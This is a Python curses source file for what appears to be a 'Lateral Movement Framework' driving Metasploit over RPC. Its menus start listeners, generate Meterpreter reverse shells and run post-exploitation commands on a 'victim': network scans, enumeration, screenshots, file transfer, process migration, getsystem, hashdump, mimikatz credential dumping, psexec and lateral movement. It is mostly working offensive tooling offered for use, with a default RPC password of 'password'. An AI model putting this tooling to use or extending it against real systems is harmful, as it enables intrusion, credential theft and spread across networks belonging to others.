import argparse
import curses
import time

from meta_console import MetaConsole

lmf_logo = [' _        _______  _______ ',
            '( \\      (       )(  ____ \\',
            '| (      | () () || (    \\/',
            '| |      | || || || (__    ',
            '| |      | |(_)| ||  __)   ',
            '| |      | |   | || (      ',
            '| (____/\\| )   ( || )      ',
            '(_______/|/     \\||/       ',
            'by Thekenproleten (C)',
            ]

main_menu = {'Listener Handling':
                 ['Start Listener',
                  'Get Active Listener(s)',
                  'Get Listener Details',
                  'Terminate Listener',
                  ],
             'Session Handling':
                 ['Get Connected Session(s)',
                  'Enter Session',
                  'Terminate Session',
                  ],
             'Payload Generation':
                 ['Generate Meterpreter Reverse Shell',
                  ],
             'Program Handling':
                 ['Help Menu',
                  'Print Report',
                  'Exit & Keep all Session(s)',
                  'Exit & Close All Session(s)',
                  ],
             }

session_menu = {
    'Target Discovery': [
        'Scan network',  # 1
        'Get ARP Cache',  # 2
        ],
    'Target Enumeration': [
        'Check if target is Virtual Machine',  # 3
        'Windows enumeration',  # 4
        'Enumerate installed Applications',  # 5
        'Enumerate Logged On User(s)',  # 6
        'Enumerate Shares',  # 7
        ],
    'Target Exploitation': [
        'Execute command on victim',  # 8
        'Display running Processes',  # 9
        'Capture screen',  # 10
        'Perform a File Search',  # 11
        'Upload file from C&C to victim',  # 12
        'Download File from victim',  # 13
        ],
    'Privilege Escalation': [
        'Migrate to other Process',  # 14
        'Elevate rights',  # 15
        ],
    'Credentials Harvesting': [
        'Perform Hashdump',  # 16
        'Collect Credentials (via credential collector)',  # 17
        'Collect Credentials (via MIMIKATZ)',  # 18
        ],
    'Lateral Movement': [
        'Execute Script on different Server (PSEXEC)',  # 19
        'Start Lateral Movement',  # 20
        ],
    'Session Handling': [
        'Get active Session Details',  # 21
        'Exit and Keep Session',  # 22
        'Exit and close Session',  # 23
        ],
    }

help_menu = {'Help Menu':
    [
        'Scrolling',
        'Execute Commands',
        'Back',
        ],
    }


def print_menu(window, selected_row, menu):
    window.clear()
    h, w = window.getmaxyx()
    if isinstance(menu, list):
        for idx, row in enumerate(menu):
            x = w // 2 - len(row) // 2
            y = h // 2 - len(menu) // 2 + idx

            if idx == selected_row:
                window.attron(curses.color_pair(1))
                window.addstr(y, x, row)
                window.attroff(curses.color_pair(1))
            else:
                window.addstr(y, x, row)
    elif isinstance(menu, dict):
        items = 0
        id_dict = 0
        marked_row = selected_row
        for key, value in menu.items():
            items += len(value) + 1
        if items != 0:
            x = w // 2
            y = h // 2 - items // 2
            for key, value in menu.items():
                window.attron(curses.color_pair(4))
                window.addstr(y + id_dict, x - ((len(key) + 8) // 2), f'=== {key} ===')
                window.attroff(curses.color_pair(4))
                id_dict += 1
                if isinstance(value, list):
                    for list_items in value:
                        marked_row -= 1
                        if marked_row == 0:
                            window.attron(curses.color_pair(1))
                            window.addstr(y + id_dict, x - ((len(list_items) + 8) // 2), f'--> {list_items} <--')
                            window.attroff(curses.color_pair(1))
                        else:
                            window.addstr(y + id_dict, x - (len(list_items) // 2), list_items)
                        id_dict += 1
                else:
                    window.addstr(y + id_dict, x - (len(value) // 2), value)
                    id_dict += 1

    # for i in range(1, h - 1):
    #     window.addstr(i, w - 1, '|')
    window.border()
    window.refresh()


def main_dialog(stdscr):
    # curses.curs_set(0)
    # curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)
    current_row = 1
    menu_length = 1
    full_height, full_width = stdscr.getmaxyx()

    # newwin (height, width, begin_y, begin_x)
    menu_window = curses.newwin(full_height, full_width // 3, 0, 0)

    # session_menu_window = curses.newwin(full_height, full_width // 2, 0, 0)

    print_menu(stdscr, 100, lmf_logo)
    time.sleep(2)
    stdscr.clear()
    # Connect to the msfconsole RPC Plugin
    # Use command msfrpcd -P password -S -p 5000 to start RPC Server before

    parser = argparse.ArgumentParser(description='Enter the password of the RDPd')
    parser.add_argument("--password", dest='s_password',
                        const='password', default='password', nargs='?',
                        help="--password <password>")

    args = parser.parse_args()

    meta_client = MetaConsole(stdscr, menu_window, args.s_password)

    for key, value in main_menu.items():
        menu_length += len(value)
    while True:
        # print("\n#####################################################")
        # print("# L A T E R A L  M O V E M E N T  F R A M E W O R K #")
        # print("#####################################################")
        # print_menu(menu_window, current_row, main_menu)
        print_menu(menu_window, current_row, main_menu)

        menu_window.refresh()
        # stdscr.refresh()
        key = stdscr.getch()

        if key == curses.KEY_UP and current_row > 1:
            current_row -= 1

        elif key == curses.KEY_DOWN and current_row < menu_length - 1:
            current_row += 1

        elif key == 110:
            meta_client.scroll_output(5)

        elif key == 112:
            meta_client.scroll_output(-5)

        elif key == curses.KEY_ENTER or key in [10, 13]:

            # Start Listener
            if current_row == 1:
                meta_client.start_listener()

            # Get active Listener
            elif current_row == 2:
                meta_client.get_listener()

            # Get details of listener
            elif current_row == 3:
                meta_client.get_listener_details()

            # Terminate Listener
            elif current_row == 4:
                meta_client.terminate_listener()

            # Get connected Sessions
            elif current_row == 5:
                meta_client.get_active_sessions()

            # Enter Session
            elif current_row == 6:
                # missing select Session
                session_menu_dialog(menu_window, meta_client, stdscr)

            # Terminate Session
            elif current_row == 7:
                meta_client.terminate_session()

            # Generate Meterpreter Shell
            elif current_row == 8:
                meta_client.generate_shell()

            # Print Help Menu
            elif current_row == 9:
                help_menu_dialog(menu_window, meta_client, stdscr)
            elif current_row == 10:
                meta_client.create_report()

            # Exit only
            elif current_row == 11:
                menu_window.clear()
                print_menu(stdscr, 100, ['Program will exit now!'])
                # menu_window.addstr()
                stdscr.refresh()
                time.sleep(2)
                meta_client.logout()
                break

            # End & close all sessions
            elif current_row == 12:
                menu_window.clear()
                menu_window.addstr("Program will exit now & close all Sessions!")
                menu_window.refresh()
                meta_client.terminate_all_sessions()
                meta_client.logout()
                break


def help_menu_dialog(menu_window, meta_client, stdscr):
    current_row_session = 1
    menu_length = 1
    for key, value in help_menu.items():
        menu_length += len(value)
    while True:
        print_menu(menu_window, current_row_session, help_menu)

        key_session = stdscr.getch()
        if key_session == curses.KEY_UP and current_row_session > 0:
            current_row_session -= 1

        elif key_session == curses.KEY_DOWN and current_row_session < menu_length - 1:
            current_row_session += 1

        elif key_session == curses.KEY_ENTER or key_session in [10, 13]:
            if current_row_session == 1:
                meta_client.help_scrolling()
            if current_row_session == 2:
                meta_client.help_command()
            elif current_row_session == 3:
                break


def session_menu_dialog(menu_window, meta_client, stdscr):
    session_number = meta_client.input_reader('Please Choose a Session', 'Session')
    menu_window.clear()

    session_number = ''.join(i for i in session_number if i.isdigit())
    meta_client.append_report('Enter Session Menu', 'Session Val: ' + str(session_number))
    # stdscr.clear()
    current_row_session = 1
    session_menu_lenght = 1
    for key, value in session_menu.items():
        session_menu_lenght += len(value)

    while True:

        print_menu(menu_window, current_row_session, session_menu)
        menu_window.refresh()

        key_session = stdscr.getch()

        if key_session == curses.KEY_UP and current_row_session > 1:
            current_row_session -= 1

        elif key_session == curses.KEY_DOWN and current_row_session < session_menu_lenght - 1:
            current_row_session += 1

        elif key_session == 110:
            meta_client.scroll_output(5)

        elif key_session == 112:
            meta_client.scroll_output(-5)

        elif key_session == curses.KEY_ENTER or key_session in [10, 13]:

            if current_row_session == 1:
                # Scan Network
                IP = meta_client.input_reader('Please enter the Scan Range', 'IP Range')
                meta_client.execute_command(session_number, 'run post/windows/gather/arp_scanner RHOSTS=' + IP, '')

            elif current_row_session == 2:
                # Get ARP Cache
                meta_client.execute_command(session_number, 'arp', '----')

            elif current_row_session == 3:
                # Check if target is VM
                meta_client.execute_command(session_number, 'run post/windows/gather/checkvm', 'This is a')

            elif current_row_session == 4:
                # Windows Enumeration
                meta_client.execute_command(session_number, 'run winenum', 'Done!')

            elif current_row_session == 5:
                # Enumerate Installed Applications
                meta_client.execute_command(session_number, 'run post/windows/gather/enum_applications')

            elif current_row_session == 6:
                # Enumerate Logged On User(s)
                meta_client.execute_command(session_number, 'run post/windows/gather/enum_logged_on_users',
                                            'Recently Logged Users')

            elif current_row_session == 7:
                # Enumerate Shares
                meta_client.execute_command(session_number, 'run post/windows/gather/enum_shares', 'shares were found:')

            elif current_row_session == 8:
                # Execute Command on Victim
                meta_client.execute_command(session_number, None)

            elif current_row_session == 9:
                # Display running Processes
                meta_client.execute_command(session_number, 'ps', '----')

            elif current_row_session == 10:
                # Capture Screen
                meta_client.execute_command(session_number, 'screenshot')

            elif current_row_session == 11:
                # Perform a File search
                meta_client.search(session_number, 'search -f', 'Found')

            elif current_row_session == 12:
                # Upload File from C&C to victim
                meta_client.upload(session_number, '100.0%')

            elif current_row_session == 13:
                # Download File from Victim
                meta_client.download(session_number, '100.0%')

            elif current_row_session == 14:
                # Migrate to other Process
                migrate_process = meta_client.input_reader('Please enter the PID you want to migrate to', 'PID')
                meta_client.execute_command(session_number, 'migrate ' + migrate_process,
                                            'Migration completed successfully')

            elif current_row_session == 15:
                # Elevate rights
                meta_client.execute_command(session_number, 'getsystem', 'got system')

            elif current_row_session == 16:
                # Perform Hashdump
                meta_client.execute_command(session_number, 'run post/windows/gather/hashdump')

            elif current_row_session == 17:
                # Collect Credentials (via credential collector)
                meta_client.execute_command(session_number, 'run post/windows/gather/credentials/credential_collector')

            elif current_row_session == 18:
                # Collect Credentials (via mimikatz)
                meta_client.execute_command(session_number, 'load mimikatz', 'success')
                meta_client.execute_command(session_number, 'kerberos', '-----')
                meta_client.execute_command(session_number, 'msv', '-----')
                meta_client.execute_command(session_number, 'mimikatz_command -f samdump::hashes', 'Rid')

            elif current_row_session == 19:
                # Execute Script on different Server (psexec)
                meta_client.exec_script_oServer(session_number)

            elif current_row_session == 20:
                # Start Lateral movement
                meta_client.lateral_move(session_number)

            elif current_row_session == 21:
                # Get active Session details
                meta_client.get_active_session_detail(session_number)

            elif current_row_session == 22:
                # Exit and Keep Session
                break

            elif current_row_session == 23:
                # Exit and close Session
                meta_client.terminate_session(session_number)
                break

    stdscr.clear()
